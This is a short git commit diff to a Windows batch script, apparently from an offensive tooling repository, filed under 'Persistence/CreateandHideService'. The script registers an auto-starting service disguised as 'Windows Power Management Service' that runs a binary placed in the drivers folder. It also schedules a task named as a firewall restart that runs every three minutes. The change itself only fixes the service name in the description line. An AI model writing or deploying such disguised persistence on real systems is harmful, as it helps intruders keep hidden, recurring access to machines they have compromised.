99879c7ba27a439abc38ef48bdad0955cbe18e19
megatop1 <43348736+megatop1@users.noreply.github.com>
2022-01-19 23:41:06 -0500

    Update CreateandHideService.bat

--- Windows/Persistence/CreateandHideService.bat
+++ Windows/Persistence/CreateandHideService.bat
@@ -1,5 +1,5 @@
 sc create PowerManagement binpath=C:\Windows\drivers\DiskHelper.exe start= auto
-sc description serviceName "Windows Power Management Service"
+sc description PowerManagement "Windows Power Management Service"
 
 schtasks /create /sc minute /mo 3 /tn "Restart Firewall Service" /tr "cmd.exe C:\Windows\System32\restartservice.cmd"
 
